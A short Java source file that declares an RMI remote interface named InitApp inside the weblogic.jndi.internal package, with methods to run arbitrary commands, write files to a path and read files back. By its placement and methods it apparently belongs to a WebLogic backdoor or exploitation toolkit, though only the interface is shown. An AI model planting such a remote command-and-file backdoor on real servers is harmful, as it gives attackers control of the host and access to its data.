package weblogic.jndi.internal;

import java.rmi.Remote;

public interface InitApp extends Remote {
	String runCmd(String []cmd) ;
	String putFile(byte Content[],String Path);
	byte[] getFile(String Path);
}
